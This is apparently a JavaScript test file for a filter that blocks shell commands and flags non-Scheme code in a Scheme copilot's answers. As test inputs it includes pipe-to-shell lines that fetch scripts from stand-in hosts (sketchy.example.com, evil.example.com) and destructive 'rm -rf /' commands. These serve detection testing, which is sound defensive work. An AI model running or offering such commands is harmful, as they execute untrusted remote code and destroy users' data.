// tests/security/output-filter.test.js
//
// Verifies the non-Scheme output filter (lib/security/output-filter.js).
// Provenance: Alfred lock 2026-07-17 — no non-Scheme output from
// copilot/* verbs; bash HARD REFUSE, python/js/ruby WARN wrap, Scheme
// passes through.

import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  scanForNonScheme,
  filterOutput,
  filterAlistAnswer,
  SHELL_REFUSAL,
  NONSCHEME_WARNING_PREFIX,
} from '../../lib/security/output-filter.js'
import { Sym } from '../../src/reader.js'

// ── scanForNonScheme ────────────────────────────────────────────────

test('scan — empty / null input → safe', () => {
  assert.deepEqual(scanForNonScheme(''), { safe: true, kind: null, matches: [] })
  assert.deepEqual(scanForNonScheme(null), { safe: true, kind: null, matches: [] })
  assert.deepEqual(scanForNonScheme(undefined), { safe: true, kind: null, matches: [] })
})

test('scan — pure Scheme is safe', () => {
  const src = '(define (double x) (* x 2))\n(display (double 21))'
  const r = scanForNonScheme(src)
  assert.equal(r.safe, true)
  assert.equal(r.kind, null)
})

test('scan — Scheme fenced block is safe', () => {
  const src = 'Here you go:\n```scheme\n(map + \'(1 2 3) \'(4 5 6))\n```'
  const r = scanForNonScheme(src)
  assert.equal(r.safe, true)
})

// ── shell detection (HARD REFUSE) ──────────────────────────────────

test('scan — bash shebang → shell', () => {
  const r = scanForNonScheme('#!/bin/bash\necho hi')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'shell')
})

test('scan — /usr/bin/env python shebang → shell (all shebangs treated as shell)', () => {
  const r = scanForNonScheme('#!/usr/bin/env python\nprint("hi")')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'shell')
})

test('scan — rm -rf is shell', () => {
  const r = scanForNonScheme('run this: rm -rf ~/tmp')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'shell')
})

test('scan — sudo is shell', () => {
  const r = scanForNonScheme('sudo apt-get install foo')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'shell')
})

test('scan — curl | sh pipe-to-shell is shell', () => {
  const r = scanForNonScheme('curl https://sketchy.example.com/install.sh | sh')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'shell')
})

test('scan — bash -c is shell', () => {
  const r = scanForNonScheme("bash -c 'echo hello'")
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'shell')
})

test('scan — process substitution is shell', () => {
  const r = scanForNonScheme('diff <(sort a.txt) <(sort b.txt)')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'shell')
})

test('scan — command substitution around rm is shell', () => {
  const r = scanForNonScheme('$(rm -rf /tmp/foo)')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'shell')
})

test('scan — ```bash fenced block is shell', () => {
  const r = scanForNonScheme('here:\n```bash\necho hi\n```')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'shell')
})

test('scan — > /dev/null is shell', () => {
  const r = scanForNonScheme('run: my-cmd > /dev/null 2>&1')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'shell')
})

test('scan — chmod 755 is shell', () => {
  const r = scanForNonScheme('chmod 755 script.sh')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'shell')
})

// ── python detection (WARN) ────────────────────────────────────────

test('scan — python def is python', () => {
  const r = scanForNonScheme('def double(x):\n  return x * 2')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'python')
})

test('scan — python class is python', () => {
  const r = scanForNonScheme('class Foo(Bar):\n    pass')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'python')
})

test('scan — python from-import is python', () => {
  const r = scanForNonScheme('from collections import defaultdict')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'python')
})

test('scan — ```python fenced block is python', () => {
  const r = scanForNonScheme('```python\nprint("hi")\n```')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'python')
})

test('scan — python __main__ idiom is python', () => {
  const r = scanForNonScheme('if __name__ == "__main__":\n  main()')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'python')
})

// ── js detection (WARN) ────────────────────────────────────────────

test('scan — js function decl is js', () => {
  const r = scanForNonScheme('function double(x) { return x * 2; }')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'js')
})

test('scan — js const decl is js', () => {
  const r = scanForNonScheme('const answer = 42;')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'js')
})

test('scan — js require() is js', () => {
  const r = scanForNonScheme("const fs = require('fs')")
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'js')
})

test('scan — js import is js', () => {
  const r = scanForNonScheme("import { readFile } from 'fs'")
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'js')
})

test('scan — js export is js', () => {
  const r = scanForNonScheme('export const answer = 42')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'js')
})

test('scan — ```typescript fenced block is js', () => {
  const r = scanForNonScheme('```typescript\ntype Foo = string\n```')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'js')
})

// ── ruby detection (WARN) ──────────────────────────────────────────

test('scan — ruby def (no parens) is ruby', () => {
  const r = scanForNonScheme('def hello\n  puts "hi"\nend')
  assert.equal(r.safe, false)
  // The `puts "hi"` and the def+newline both match — either shell-hits-first
  // rule doesn't apply, so this is ruby.
  assert.equal(r.kind, 'ruby')
})

test('scan — attr_accessor is ruby', () => {
  const r = scanForNonScheme('attr_accessor :name, :email')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'ruby')
})

test('scan — ```ruby fenced block is ruby', () => {
  const r = scanForNonScheme('```ruby\nputs "hi"\n```')
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'ruby')
})

// ── false-positive avoidance ───────────────────────────────────────

test('scan — mentioning "def" or "class" in prose does NOT trip', () => {
  // Prose about Scheme's `define`, not a python def(): must stay safe.
  const src = 'You can use define to declare a binding. Class is a term from ' +
    'OO languages; Scheme uses records.'
  const r = scanForNonScheme(src)
  assert.equal(r.safe, true, `expected safe, got ${JSON.stringify(r)}`)
})

test('scan — mentioning "function" in prose does NOT trip', () => {
  const src = 'A Scheme function is written using lambda: (lambda (x) x).'
  const r = scanForNonScheme(src)
  assert.equal(r.safe, true, `expected safe, got ${JSON.stringify(r)}`)
})

test('scan — mentioning "import" in prose does NOT trip', () => {
  const src = 'To import a module use (import (motoi vec)).'
  const r = scanForNonScheme(src)
  assert.equal(r.safe, true, `expected safe, got ${JSON.stringify(r)}`)
})

test('scan — Scheme (define …) does NOT trip on shell patterns', () => {
  const src = '(define (compute-total items)\n  (apply + items))'
  const r = scanForNonScheme(src)
  assert.equal(r.safe, true, `expected safe, got ${JSON.stringify(r)}`)
})

// ── precedence: shell wins ─────────────────────────────────────────

test('scan — shell inside a python fenced block is shell (not python)', () => {
  const src = '```python\n#!/bin/bash\nrm -rf /\n```'
  const r = scanForNonScheme(src)
  assert.equal(r.safe, false)
  assert.equal(r.kind, 'shell', 'shell precedence beats python')
})

// ── filterOutput end-to-end ────────────────────────────────────────

test('filter — non-string returns unchanged', () => {
  assert.equal(filterOutput(false), false)
  assert.equal(filterOutput(null), null)
  assert.deepEqual(filterOutput([1, 2, 3]), [1, 2, 3])
})

test('filter — empty string returns unchanged', () => {
  assert.equal(filterOutput(''), '')
})

test('filter — pure Scheme passes through unchanged', () => {
  const src = '(define x 42)\n(display x)'
  assert.equal(filterOutput(src), src)
})

test('filter — shell HARD REFUSE replaces response with refusal', () => {
  const src = '#!/bin/bash\nrm -rf ~/Documents'
  const out = filterOutput(src)
  assert.equal(out, SHELL_REFUSAL)
  assert.ok(!out.includes('bash'), 'refusal must not echo the bash')
  assert.ok(!out.includes('rm -rf'), 'refusal must not echo the dangerous command')
})

test('filter — python WARN wraps original with prefix', () => {
  const src = 'def double(x):\n  return x * 2'
  const out = filterOutput(src)
  assert.ok(out.startsWith(NONSCHEME_WARNING_PREFIX), 'warning prefix present')
  assert.ok(out.includes(src), 'original preserved after warning')
})

test('filter — js WARN wraps original with prefix', () => {
  const src = 'function double(x) { return x * 2; }'
  const out = filterOutput(src)
  assert.ok(out.startsWith(NONSCHEME_WARNING_PREFIX), 'warning prefix present')
  assert.ok(out.includes(src), 'original preserved after warning')
})

test('filter — curl | sh HARD REFUSE (kid must never see it)', () => {
  const src = "curl https://evil.example.com/install.sh | bash"
  const out = filterOutput(src)
  assert.equal(out, SHELL_REFUSAL)
  assert.ok(!out.includes('curl'), 'refusal must not echo the curl')
})

// ── filterAlistAnswer ──────────────────────────────────────────────

test('filterAlistAnswer — replaces :answer slot value', () => {
  const alist = [
    [new Sym(':answer'), '#!/bin/bash\nrm -rf /'],
    [new Sym(':sources'), [['verb1', 'doc']]],
  ]
  const out = filterAlistAnswer(alist)
  assert.equal(out[0][1], SHELL_REFUSAL)
  assert.deepEqual(out[1][1], [['verb1', 'doc']], ':sources unchanged')
})

test('filterAlistAnswer — replaces :llm-hit slot value', () => {
  const alist = [
    [new Sym(':registry-hit'), false],
    [new Sym(':llm-hit'), 'def foo():\n  pass'],
    [new Sym(':confidence'), new Sym('guess')],
  ]
  const out = filterAlistAnswer(alist)
  assert.ok(String(out[1][1]).startsWith(NONSCHEME_WARNING_PREFIX))
  assert.equal(out[0][1], false, ':registry-hit unchanged')
})

test('filterAlistAnswer — safe :answer passes through', () => {
  const alist = [
    [new Sym(':answer'), '(map + \'(1 2))'],
    [new Sym(':sources'), []],
  ]
  const out = filterAlistAnswer(alist)
  assert.equal(out[0][1], '(map + \'(1 2))')
})

test('filterAlistAnswer — non-array passes through', () => {
  assert.equal(filterAlistAnswer('not-an-alist'), 'not-an-alist')
  assert.equal(filterAlistAnswer(null), null)
})
